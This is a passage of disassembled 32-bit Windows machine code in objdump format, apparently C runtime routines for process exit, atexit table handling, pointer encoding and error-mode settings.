  4061f6:	87 01                	xchg   %eax,(%ecx)
  4061f8:	33 db                	xor    %ebx,%ebx
  4061fa:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4061fd:	8b 06                	mov    (%esi),%eax
  4061ff:	8b 00                	mov    (%eax),%eax
  406201:	85 c0                	test   %eax,%eax
  406203:	75 2c                	jne    0x406231
  406205:	8b 3d 04 60 41 00    	mov    0x416004,%edi
  40620b:	8b cf                	mov    %edi,%ecx
  40620d:	83 e1 1f             	and    $0x1f,%ecx
  406210:	a1 30 6e 41 00       	mov    0x416e30,%eax
  406215:	3b c7                	cmp    %edi,%eax
  406217:	74 11                	je     0x40622a
  406219:	33 f8                	xor    %eax,%edi
  40621b:	d3 cf                	ror    %cl,%edi
  40621d:	53                   	push   %ebx
  40621e:	53                   	push   %ebx
  40621f:	53                   	push   %ebx
  406220:	8b cf                	mov    %edi,%ecx
  406222:	ff 15 24 f2 40 00    	call   *0x40f224
  406228:	ff d7                	call   *%edi
  40622a:	68 44 6e 41 00       	push   $0x416e44
  40622f:	eb 0a                	jmp    0x40623b
  406231:	83 f8 01             	cmp    $0x1,%eax
  406234:	75 0b                	jne    0x406241
  406236:	68 50 6e 41 00       	push   $0x416e50
  40623b:	e8 c2 06 00 00       	call   0x406902
  406240:	59                   	pop    %ecx
  406241:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406248:	8b 06                	mov    (%esi),%eax
  40624a:	39 18                	cmp    %ebx,(%eax)
  40624c:	75 11                	jne    0x40625f
  40624e:	68 68 f2 40 00       	push   $0x40f268
  406253:	68 58 f2 40 00       	push   $0x40f258
  406258:	e8 b6 fe ff ff       	call   0x406113
  40625d:	59                   	pop    %ecx
  40625e:	59                   	pop    %ecx
  40625f:	68 70 f2 40 00       	push   $0x40f270
  406264:	68 6c f2 40 00       	push   $0x40f26c
  406269:	e8 a5 fe ff ff       	call   0x406113
  40626e:	59                   	pop    %ecx
  40626f:	59                   	pop    %ecx
  406270:	8b 46 04             	mov    0x4(%esi),%eax
  406273:	39 18                	cmp    %ebx,(%eax)
  406275:	75 0d                	jne    0x406284
  406277:	c6 05 34 6e 41 00 01 	movb   $0x1,0x416e34
  40627e:	8b 46 08             	mov    0x8(%esi),%eax
  406281:	c6 00 01             	movb   $0x1,(%eax)
  406284:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406287:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40628e:	59                   	pop    %ecx
  40628f:	5f                   	pop    %edi
  406290:	5e                   	pop    %esi
  406291:	5b                   	pop    %ebx
  406292:	c9                   	leave
  406293:	c3                   	ret
  406294:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406297:	8b 00                	mov    (%eax),%eax
  406299:	ff 30                	push   (%eax)
  40629b:	e8 0d 00 00 00       	call   0x4062ad
  4062a0:	83 c4 04             	add    $0x4,%esp
  4062a3:	c3                   	ret
  4062a4:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4062a7:	e8 7b 08 00 00       	call   0x406b27
  4062ac:	cc                   	int3
  4062ad:	8b ff                	mov    %edi,%edi
  4062af:	55                   	push   %ebp
  4062b0:	8b ec                	mov    %esp,%ebp
  4062b2:	33 c0                	xor    %eax,%eax
  4062b4:	81 7d 08 63 73 6d e0 	cmpl   $0xe06d7363,0x8(%ebp)
  4062bb:	0f 94 c0             	sete   %al
  4062be:	5d                   	pop    %ebp
  4062bf:	c3                   	ret
  4062c0:	8b ff                	mov    %edi,%edi
  4062c2:	55                   	push   %ebp
  4062c3:	8b ec                	mov    %esp,%ebp
  4062c5:	83 ec 18             	sub    $0x18,%esp
  4062c8:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4062cc:	75 12                	jne    0x4062e0
  4062ce:	e8 93 00 00 00       	call   0x406366
  4062d3:	84 c0                	test   %al,%al
  4062d5:	74 09                	je     0x4062e0
  4062d7:	ff 75 08             	push   0x8(%ebp)
  4062da:	e8 ca 00 00 00       	call   0x4063a9
  4062df:	59                   	pop    %ecx
  4062e0:	8d 45 0c             	lea    0xc(%ebp),%eax
  4062e3:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  4062e7:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4062ea:	8d 4d fe             	lea    -0x2(%ebp),%ecx
  4062ed:	8d 45 10             	lea    0x10(%ebp),%eax
  4062f0:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4062f3:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4062f6:	6a 02                	push   $0x2
  4062f8:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4062fb:	58                   	pop    %eax
  4062fc:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4062ff:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406302:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406305:	50                   	push   %eax
  406306:	8d 45 e8             	lea    -0x18(%ebp),%eax
  406309:	50                   	push   %eax
  40630a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40630d:	50                   	push   %eax
  40630e:	e8 73 fe ff ff       	call   0x406186
  406313:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  406317:	74 02                	je     0x40631b
  406319:	c9                   	leave
  40631a:	c3                   	ret
  40631b:	ff 75 08             	push   0x8(%ebp)
  40631e:	e8 01 00 00 00       	call   0x406324
  406323:	cc                   	int3
  406324:	8b ff                	mov    %edi,%edi
  406326:	55                   	push   %ebp
  406327:	8b ec                	mov    %esp,%ebp
  406329:	e8 05 2c 00 00       	call   0x408f33
  40632e:	83 f8 01             	cmp    $0x1,%eax
  406331:	74 20                	je     0x406353
  406333:	64 a1 30 00 00 00    	mov    %fs:0x30,%eax
  406339:	8b 40 68             	mov    0x68(%eax),%eax
  40633c:	c1 e8 08             	shr    $0x8,%eax
  40633f:	a8 01                	test   $0x1,%al
  406341:	75 10                	jne    0x406353
  406343:	ff 75 08             	push   0x8(%ebp)
  406346:	ff 15 f4 f0 40 00    	call   *0x40f0f4
  40634c:	50                   	push   %eax
  40634d:	ff 15 ec f0 40 00    	call   *0x40f0ec
  406353:	ff 75 08             	push   0x8(%ebp)
  406356:	e8 4e 00 00 00       	call   0x4063a9
  40635b:	59                   	pop    %ecx
  40635c:	ff 75 08             	push   0x8(%ebp)
  40635f:	ff 15 10 f1 40 00    	call   *0x40f110
  406365:	cc                   	int3
  406366:	6a 00                	push   $0x0
  406368:	ff 15 a4 f0 40 00    	call   *0x40f0a4
  40636e:	85 c0                	test   %eax,%eax
  406370:	74 34                	je     0x4063a6
  406372:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
  406377:	66 39 08             	cmp    %cx,(%eax)
  40637a:	75 2a                	jne    0x4063a6
  40637c:	8b 48 3c             	mov    0x3c(%eax),%ecx
  40637f:	03 c8                	add    %eax,%ecx
  406381:	81 39 50 45 00 00    	cmpl   $0x4550,(%ecx)
  406387:	75 1d                	jne    0x4063a6
  406389:	b8 0b 01 00 00       	mov    $0x10b,%eax
  40638e:	66 39 41 18          	cmp    %ax,0x18(%ecx)
  406392:	75 12                	jne    0x4063a6
  406394:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  406398:	76 0c                	jbe    0x4063a6
  40639a:	83 b9 e8 00 00 00 00 	cmpl   $0x0,0xe8(%ecx)
  4063a1:	74 03                	je     0x4063a6
  4063a3:	b0 01                	mov    $0x1,%al
  4063a5:	c3                   	ret
  4063a6:	32 c0                	xor    %al,%al
  4063a8:	c3                   	ret
  4063a9:	8b ff                	mov    %edi,%edi
  4063ab:	55                   	push   %ebp
  4063ac:	8b ec                	mov    %esp,%ebp
  4063ae:	51                   	push   %ecx
  4063af:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4063b3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4063b6:	50                   	push   %eax
  4063b7:	68 64 fe 40 00       	push   $0x40fe64
  4063bc:	6a 00                	push   $0x0
  4063be:	ff 15 ac f1 40 00    	call   *0x40f1ac
  4063c4:	85 c0                	test   %eax,%eax
  4063c6:	74 23                	je     0x4063eb
  4063c8:	56                   	push   %esi
  4063c9:	68 7c fe 40 00       	push   $0x40fe7c
  4063ce:	ff 75 fc             	push   -0x4(%ebp)
  4063d1:	ff 15 8c f0 40 00    	call   *0x40f08c
  4063d7:	8b f0                	mov    %eax,%esi
  4063d9:	85 f6                	test   %esi,%esi
  4063db:	74 0d                	je     0x4063ea
  4063dd:	ff 75 08             	push   0x8(%ebp)
  4063e0:	8b ce                	mov    %esi,%ecx
  4063e2:	ff 15 24 f2 40 00    	call   *0x40f224
  4063e8:	ff d6                	call   *%esi
  4063ea:	5e                   	pop    %esi
  4063eb:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4063ef:	74 09                	je     0x4063fa
  4063f1:	ff 75 fc             	push   -0x4(%ebp)
  4063f4:	ff 15 a8 f0 40 00    	call   *0x40f0a8
  4063fa:	c9                   	leave
  4063fb:	c3                   	ret
  4063fc:	8b ff                	mov    %edi,%edi
  4063fe:	55                   	push   %ebp
  4063ff:	8b ec                	mov    %esp,%ebp
  406401:	8b 45 08             	mov    0x8(%ebp),%eax
  406404:	a3 30 6e 41 00       	mov    %eax,0x416e30
  406409:	5d                   	pop    %ebp
  40640a:	c3                   	ret
  40640b:	6a 01                	push   $0x1
  40640d:	6a 02                	push   $0x2
  40640f:	6a 00                	push   $0x0
  406411:	e8 aa fe ff ff       	call   0x4062c0
  406416:	83 c4 0c             	add    $0xc,%esp
  406419:	c3                   	ret
  40641a:	6a 01                	push   $0x1
  40641c:	6a 00                	push   $0x0
  40641e:	6a 00                	push   $0x0
  406420:	e8 9b fe ff ff       	call   0x4062c0
  406425:	83 c4 0c             	add    $0xc,%esp
  406428:	c3                   	ret
  406429:	8b ff                	mov    %edi,%edi
  40642b:	55                   	push   %ebp
  40642c:	8b ec                	mov    %esp,%ebp
  40642e:	6a 00                	push   $0x0
  406430:	6a 02                	push   $0x2
  406432:	ff 75 08             	push   0x8(%ebp)
  406435:	e8 86 fe ff ff       	call   0x4062c0
  40643a:	83 c4 0c             	add    $0xc,%esp
  40643d:	5d                   	pop    %ebp
  40643e:	c3                   	ret
  40643f:	8b ff                	mov    %edi,%edi
  406441:	55                   	push   %ebp
  406442:	8b ec                	mov    %esp,%ebp
  406444:	a1 30 6e 41 00       	mov    0x416e30,%eax
  406449:	3b 05 04 60 41 00    	cmp    0x416004,%eax
  40644f:	0f 85 d2 06 00 00    	jne    0x406b27
  406455:	ff 75 08             	push   0x8(%ebp)
  406458:	e8 e5 f6 ff ff       	call   0x405b42
  40645d:	59                   	pop    %ecx
  40645e:	a3 30 6e 41 00       	mov    %eax,0x416e30
  406463:	5d                   	pop    %ebp
  406464:	c3                   	ret
  406465:	8b ff                	mov    %edi,%edi
  406467:	55                   	push   %ebp
  406468:	8b ec                	mov    %esp,%ebp
  40646a:	6a 00                	push   $0x0
  40646c:	6a 00                	push   $0x0
  40646e:	ff 75 08             	push   0x8(%ebp)
  406471:	e8 4a fe ff ff       	call   0x4062c0
  406476:	83 c4 0c             	add    $0xc,%esp
  406479:	5d                   	pop    %ebp
  40647a:	c3                   	ret
  40647b:	8b ff                	mov    %edi,%edi
  40647d:	55                   	push   %ebp
  40647e:	8b ec                	mov    %esp,%ebp
  406480:	8b 45 08             	mov    0x8(%ebp),%eax
  406483:	3d 00 40 00 00       	cmp    $0x4000,%eax
  406488:	74 23                	je     0x4064ad
  40648a:	3d 00 80 00 00       	cmp    $0x8000,%eax
  40648f:	74 1c                	je     0x4064ad
  406491:	3d 00 00 01 00       	cmp    $0x10000,%eax
  406496:	74 15                	je     0x4064ad
  406498:	e8 1e 10 00 00       	call   0x4074bb
  40649d:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4064a3:	e8 56 0f 00 00       	call   0x4073fe
  4064a8:	6a 16                	push   $0x16
  4064aa:	58                   	pop    %eax
  4064ab:	5d                   	pop    %ebp
  4064ac:	c3                   	ret
  4064ad:	b9 c0 70 41 00       	mov    $0x4170c0,%ecx
  4064b2:	87 01                	xchg   %eax,(%ecx)
  4064b4:	33 c0                	xor    %eax,%eax
  4064b6:	5d                   	pop    %ebp
  4064b7:	c3                   	ret
  4064b8:	6a 0c                	push   $0xc
  4064ba:	68 18 49 41 00       	push   $0x414918
  4064bf:	e8 2c dd ff ff       	call   0x4041f0
  4064c4:	8b 45 08             	mov    0x8(%ebp),%eax
  4064c7:	ff 30                	push   (%eax)
  4064c9:	e8 ef 14 00 00       	call   0x4079bd
  4064ce:	59                   	pop    %ecx
  4064cf:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4064d3:	be 38 6f 41 00       	mov    $0x416f38,%esi
  4064d8:	bf 60 60 41 00       	mov    $0x416060,%edi
  4064dd:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4064e0:	81 fe 3c 6f 41 00    	cmp    $0x416f3c,%esi
  4064e6:	74 14                	je     0x4064fc
  4064e8:	39 3e                	cmp    %edi,(%esi)
  4064ea:	74 0b                	je     0x4064f7
  4064ec:	57                   	push   %edi
  4064ed:	56                   	push   %esi
  4064ee:	e8 ff 35 00 00       	call   0x409af2
  4064f3:	59                   	pop    %ecx
  4064f4:	59                   	pop    %ecx
  4064f5:	89 06                	mov    %eax,(%esi)
  4064f7:	83 c6 04             	add    $0x4,%esi
  4064fa:	eb e1                	jmp    0x4064dd
  4064fc:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406503:	e8 12 00 00 00       	call   0x40651a
  406508:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40650b:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406512:	59                   	pop    %ecx
  406513:	5f                   	pop    %edi
  406514:	5e                   	pop    %esi
  406515:	5b                   	pop    %ebx
  406516:	c9                   	leave
  406517:	c2 0c 00             	ret    $0xc
  40651a:	8b 45 10             	mov    0x10(%ebp),%eax
  40651d:	ff 30                	push   (%eax)
  40651f:	e8 e1 14 00 00       	call   0x407a05
  406524:	59                   	pop    %ecx
  406525:	c3                   	ret
  406526:	8b ff                	mov    %edi,%edi
  406528:	55                   	push   %ebp
  406529:	8b ec                	mov    %esp,%ebp
  40652b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40652e:	8d 41 01             	lea    0x1(%ecx),%eax
  406531:	3d 00 01 00 00       	cmp    $0x100,%eax
  406536:	77 0c                	ja     0x406544
  406538:	8b 45 08             	mov    0x8(%ebp),%eax
  40653b:	0f b7 04 48          	movzwl (%eax,%ecx,2),%eax
  40653f:	23 45 10             	and    0x10(%ebp),%eax
  406542:	5d                   	pop    %ebp
  406543:	c3                   	ret
  406544:	33 c0                	xor    %eax,%eax
  406546:	5d                   	pop    %ebp
  406547:	c3                   	ret
  406548:	33 c0                	xor    %eax,%eax
  40654a:	b9 38 6e 41 00       	mov    $0x416e38,%ecx
  40654f:	40                   	inc    %eax
  406550:	87 01                	xchg   %eax,(%ecx)
  406552:	c3                   	ret
  406553:	8b ff                	mov    %edi,%edi
  406555:	55                   	push   %ebp
  406556:	8b ec                	mov    %esp,%ebp
  406558:	83 ec 0c             	sub    $0xc,%esp
  40655b:	6a 04                	push   $0x4
  40655d:	58                   	pop    %eax
  40655e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406561:	8d 4d ff             	lea    -0x1(%ebp),%ecx
  406564:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406567:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40656a:	50                   	push   %eax
  40656b:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40656e:	50                   	push   %eax
  40656f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  406572:	50                   	push   %eax
  406573:	e8 40 ff ff ff       	call   0x4064b8
  406578:	c9                   	leave
  406579:	c3                   	ret
  40657a:	8b ff                	mov    %edi,%edi
  40657c:	55                   	push   %ebp
  40657d:	8b ec                	mov    %esp,%ebp
  40657f:	56                   	push   %esi
  406580:	e8 7b 0a 00 00       	call   0x407000
  406585:	8b 55 08             	mov    0x8(%ebp),%edx
  406588:	8b f0                	mov    %eax,%esi
  40658a:	6a 00                	push   $0x0
  40658c:	58                   	pop    %eax
  40658d:	8b 8e 50 03 00 00    	mov    0x350(%esi),%ecx
  406593:	f6 c1 02             	test   $0x2,%cl
  406596:	0f 94 c0             	sete   %al
  406599:	40                   	inc    %eax
  40659a:	83 fa ff             	cmp    $0xffffffff,%edx
  40659d:	74 33                	je     0x4065d2
  40659f:	85 d2                	test   %edx,%edx
  4065a1:	74 36                	je     0x4065d9
  4065a3:	83 fa 01             	cmp    $0x1,%edx
  4065a6:	74 1f                	je     0x4065c7
  4065a8:	83 fa 02             	cmp    $0x2,%edx
  4065ab:	74 15                	je     0x4065c2
  4065ad:	e8 09 0f 00 00       	call   0x4074bb
  4065b2:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4065b8:	e8 41 0e 00 00       	call   0x4073fe
  4065bd:	83 c8 ff             	or     $0xffffffff,%eax
  4065c0:	eb 17                	jmp    0x4065d9
  4065c2:	83 e1 fd             	and    $0xfffffffd,%ecx
  4065c5:	eb 03                	jmp    0x4065ca
  4065c7:	83 c9 02             	or     $0x2,%ecx
  4065ca:	89 8e 50 03 00 00    	mov    %ecx,0x350(%esi)
  4065d0:	eb 07                	jmp    0x4065d9
  4065d2:	83 0d a0 66 41 00 ff 	orl    $0xffffffff,0x4166a0
  4065d9:	5e                   	pop    %esi
  4065da:	5d                   	pop    %ebp
  4065db:	c3                   	ret
  4065dc:	a1 3c 6e 41 00       	mov    0x416e3c,%eax
  4065e1:	90                   	nop
  4065e2:	c3                   	ret
  4065e3:	8b ff                	mov    %edi,%edi
  4065e5:	55                   	push   %ebp
  4065e6:	8b ec                	mov    %esp,%ebp
  4065e8:	8b 45 08             	mov    0x8(%ebp),%eax
  4065eb:	85 c0                	test   %eax,%eax
  4065ed:	74 1a                	je     0x406609
  4065ef:	83 f8 01             	cmp    $0x1,%eax
  4065f2:	74 15                	je     0x406609
  4065f4:	e8 c2 0e 00 00       	call   0x4074bb
  4065f9:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  4065ff:	e8 fa 0d 00 00       	call   0x4073fe
  406604:	83 c8 ff             	or     $0xffffffff,%eax
  406607:	5d                   	pop    %ebp
  406608:	c3                   	ret
  406609:	b9 3c 6e 41 00       	mov    $0x416e3c,%ecx
  40660e:	87 01                	xchg   %eax,(%ecx)
  406610:	5d                   	pop    %ebp
  406611:	c3                   	ret
  406612:	b8 40 6e 41 00       	mov    $0x416e40,%eax
  406617:	c3                   	ret
  406618:	8b ff                	mov    %edi,%edi
  40661a:	55                   	push   %ebp
  40661b:	8b ec                	mov    %esp,%ebp
  40661d:	51                   	push   %ecx
  40661e:	ff 75 08             	push   0x8(%ebp)
  406621:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  406628:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40662b:	e8 97 14 00 00       	call   0x407ac7
  406630:	59                   	pop    %ecx
  406631:	c9                   	leave
  406632:	c3                   	ret
  406633:	6a 0c                	push   $0xc
  406635:	68 58 49 41 00       	push   $0x414958
  40663a:	e8 b1 db ff ff       	call   0x4041f0
  40663f:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  406643:	8b 45 08             	mov    0x8(%ebp),%eax
  406646:	ff 30                	push   (%eax)
  406648:	e8 70 13 00 00       	call   0x4079bd
  40664d:	59                   	pop    %ecx
  40664e:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406652:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406655:	e8 b8 01 00 00       	call   0x406812
  40665a:	8b f0                	mov    %eax,%esi
  40665c:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  40665f:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406666:	e8 17 00 00 00       	call   0x406682
  40666b:	8b c6                	mov    %esi,%eax
  40666d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406670:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406677:	59                   	pop    %ecx
  406678:	5f                   	pop    %edi
  406679:	5e                   	pop    %esi
  40667a:	5b                   	pop    %ebx
  40667b:	c9                   	leave
  40667c:	c2 0c 00             	ret    $0xc
  40667f:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  406682:	8b 45 10             	mov    0x10(%ebp),%eax
  406685:	ff 30                	push   (%eax)
  406687:	e8 79 13 00 00       	call   0x407a05
  40668c:	59                   	pop    %ecx
  40668d:	c3                   	ret
  40668e:	6a 0c                	push   $0xc
  406690:	68 38 49 41 00       	push   $0x414938
  406695:	e8 56 db ff ff       	call   0x4041f0
  40669a:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
  40669e:	8b 45 08             	mov    0x8(%ebp),%eax
  4066a1:	ff 30                	push   (%eax)
  4066a3:	e8 15 13 00 00       	call   0x4079bd
  4066a8:	59                   	pop    %ecx
  4066a9:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4066ad:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4066b0:	e8 34 00 00 00       	call   0x4066e9
  4066b5:	8b f0                	mov    %eax,%esi
  4066b7:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4066ba:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4066c1:	e8 17 00 00 00       	call   0x4066dd
  4066c6:	8b c6                	mov    %esi,%eax
  4066c8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4066cb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4066d2:	59                   	pop    %ecx
  4066d3:	5f                   	pop    %edi
  4066d4:	5e                   	pop    %esi
  4066d5:	5b                   	pop    %ebx
  4066d6:	c9                   	leave
  4066d7:	c2 0c 00             	ret    $0xc
  4066da:	8b 75 e4             	mov    -0x1c(%ebp),%esi
  4066dd:	8b 45 10             	mov    0x10(%ebp),%eax
  4066e0:	ff 30                	push   (%eax)
  4066e2:	e8 1e 13 00 00       	call   0x407a05
  4066e7:	59                   	pop    %ecx
  4066e8:	c3                   	ret
  4066e9:	8b ff                	mov    %edi,%edi
  4066eb:	55                   	push   %ebp
  4066ec:	8b ec                	mov    %esp,%ebp
  4066ee:	83 ec 0c             	sub    $0xc,%esp
  4066f1:	8b c1                	mov    %ecx,%eax
  4066f3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4066f6:	53                   	push   %ebx
  4066f7:	56                   	push   %esi
  4066f8:	8b 00                	mov    (%eax),%eax
  4066fa:	57                   	push   %edi
  4066fb:	8b 30                	mov    (%eax),%esi
  4066fd:	85 f6                	test   %esi,%esi
  4066ff:	0f 84 05 01 00 00    	je     0x40680a
  406705:	a1 04 60 41 00       	mov    0x416004,%eax
  40670a:	8b c8                	mov    %eax,%ecx
  40670c:	8b 1e                	mov    (%esi),%ebx
  40670e:	83 e1 1f             	and    $0x1f,%ecx
  406711:	8b 7e 04             	mov    0x4(%esi),%edi
  406714:	33 d8                	xor    %eax,%ebx
  406716:	8b 76 08             	mov    0x8(%esi),%esi
  406719:	33 f8                	xor    %eax,%edi
  40671b:	33 f0                	xor    %eax,%esi
  40671d:	d3 cf                	ror    %cl,%edi
  40671f:	d3 ce                	ror    %cl,%esi
  406721:	d3 cb                	ror    %cl,%ebx
  406723:	3b fe                	cmp    %esi,%edi
  406725:	0f 85 9d 00 00 00    	jne    0x4067c8
  40672b:	2b f3                	sub    %ebx,%esi
  40672d:	b8 00 02 00 00       	mov    $0x200,%eax
  406732:	c1 fe 02             	sar    $0x2,%esi
  406735:	3b f0                	cmp    %eax,%esi
  406737:	77 02                	ja     0x40673b
  406739:	8b c6                	mov    %esi,%eax
  40673b:	8d 3c 30             	lea    (%eax,%esi,1),%edi
  40673e:	85 ff                	test   %edi,%edi
  406740:	75 03                	jne    0x406745
  406742:	6a 20                	push   $0x20
  406744:	5f                   	pop    %edi
  406745:	3b fe                	cmp    %esi,%edi
  406747:	72 1d                	jb     0x406766
  406749:	6a 04                	push   $0x4
  40674b:	57                   	push   %edi
  40674c:	53                   	push   %ebx
  40674d:	e8 f0 33 00 00       	call   0x409b42
  406752:	6a 00                	push   $0x0
  406754:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406757:	e8 6b 13 00 00       	call   0x407ac7
  40675c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40675f:	83 c4 10             	add    $0x10,%esp
  406762:	85 c9                	test   %ecx,%ecx
  406764:	75 24                	jne    0x40678a
  406766:	6a 04                	push   $0x4
  406768:	8d 7e 04             	lea    0x4(%esi),%edi
  40676b:	57                   	push   %edi
  40676c:	53                   	push   %ebx
  40676d:	e8 d0 33 00 00       	call   0x409b42
  406772:	6a 00                	push   $0x0
  406774:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406777:	e8 4b 13 00 00       	call   0x407ac7
  40677c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40677f:	83 c4 10             	add    $0x10,%esp
  406782:	85 c9                	test   %ecx,%ecx
  406784:	0f 84 80 00 00 00    	je     0x40680a
  40678a:	8d 04 b1             	lea    (%ecx,%esi,4),%eax
  40678d:	8b d9                	mov    %ecx,%ebx
  40678f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406792:	8d 34 b9             	lea    (%ecx,%edi,4),%esi
  406795:	a1 04 60 41 00       	mov    0x416004,%eax
  40679a:	8b 7d fc             	mov    -0x4(%ebp),%edi
  40679d:	8b cf                	mov    %edi,%ecx
  40679f:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4067a2:	8b c6                	mov    %esi,%eax
  4067a4:	2b c7                	sub    %edi,%eax
  4067a6:	83 c0 03             	add    $0x3,%eax
  4067a9:	c1 e8 02             	shr    $0x2,%eax
  4067ac:	3b f7                	cmp    %edi,%esi
  4067ae:	1b d2                	sbb    %edx,%edx
  4067b0:	f7 d2                	not    %edx
  4067b2:	23 d0                	and    %eax,%edx
  4067b4:	74 12                	je     0x4067c8
  4067b6:	8b 7d f4             	mov    -0xc(%ebp),%edi
  4067b9:	33 c0                	xor    %eax,%eax
  4067bb:	40                   	inc    %eax
  4067bc:	89 39                	mov    %edi,(%ecx)
  4067be:	8d 49 04             	lea    0x4(%ecx),%ecx
  4067c1:	3b c2                	cmp    %edx,%eax
  4067c3:	75 f6                	jne    0x4067bb
  4067c5:	8b 7d fc             	mov    -0x4(%ebp),%edi
  4067c8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4067cb:	8b 40 04             	mov    0x4(%eax),%eax
  4067ce:	ff 30                	push   (%eax)
  4067d0:	e8 6d f3 ff ff       	call   0x405b42
  4067d5:	53                   	push   %ebx
  4067d6:	89 07                	mov    %eax,(%edi)
  4067d8:	e8 65 f3 ff ff       	call   0x405b42
  4067dd:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4067e0:	8b 0b                	mov    (%ebx),%ecx
  4067e2:	8b 09                	mov    (%ecx),%ecx
  4067e4:	89 01                	mov    %eax,(%ecx)
  4067e6:	8d 47 04             	lea    0x4(%edi),%eax
  4067e9:	50                   	push   %eax
  4067ea:	e8 53 f3 ff ff       	call   0x405b42
  4067ef:	8b 0b                	mov    (%ebx),%ecx
  4067f1:	56                   	push   %esi
  4067f2:	8b 09                	mov    (%ecx),%ecx
  4067f4:	89 41 04             	mov    %eax,0x4(%ecx)
  4067f7:	e8 46 f3 ff ff       	call   0x405b42
  4067fc:	8b 0b                	mov    (%ebx),%ecx
  4067fe:	83 c4 10             	add    $0x10,%esp
  406801:	8b 09                	mov    (%ecx),%ecx
  406803:	89 41 08             	mov    %eax,0x8(%ecx)
  406806:	33 c0                	xor    %eax,%eax
  406808:	eb 03                	jmp    0x40680d
  40680a:	83 c8 ff             	or     $0xffffffff,%eax
  40680d:	5f                   	pop    %edi
  40680e:	5e                   	pop    %esi
  40680f:	5b                   	pop    %ebx
  406810:	c9                   	leave
  406811:	c3                   	ret
  406812:	8b ff                	mov    %edi,%edi
  406814:	55                   	push   %ebp
  406815:	8b ec                	mov    %esp,%ebp
  406817:	83 ec 14             	sub    $0x14,%esp
  40681a:	53                   	push   %ebx
  40681b:	8b d9                	mov    %ecx,%ebx
  40681d:	57                   	push   %edi
  40681e:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  406821:	8b 03                	mov    (%ebx),%eax
  406823:	8b 38                	mov    (%eax),%edi
  406825:	85 ff                	test   %edi,%edi
  406827:	75 08                	jne    0x406831
  406829:	83 c8 ff             	or     $0xffffffff,%eax
  40682c:	e9 b7 00 00 00       	jmp    0x4068e8
  406831:	8b 15 04 60 41 00    	mov    0x416004,%edx
  406837:	8b ca                	mov    %edx,%ecx
  406839:	56                   	push   %esi
  40683a:	8b 37                	mov    (%edi),%esi
  40683c:	83 e1 1f             	and    $0x1f,%ecx
  40683f:	8b 7f 04             	mov    0x4(%edi),%edi
  406842:	33 f2                	xor    %edx,%esi
  406844:	33 fa                	xor    %edx,%edi
  406846:	d3 ce                	ror    %cl,%esi
  406848:	d3 cf                	ror    %cl,%edi
  40684a:	85 f6                	test   %esi,%esi
  40684c:	0f 84 93 00 00 00    	je     0x4068e5
  406852:	83 fe ff             	cmp    $0xffffffff,%esi
  406855:	0f 84 8a 00 00 00    	je     0x4068e5
  40685b:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40685e:	89 7d f4             	mov    %edi,-0xc(%ebp)
  406861:	89 75 f8             	mov    %esi,-0x8(%ebp)
  406864:	83 ef 04             	sub    $0x4,%edi
  406867:	3b fe                	cmp    %esi,%edi
  406869:	72 54                	jb     0x4068bf
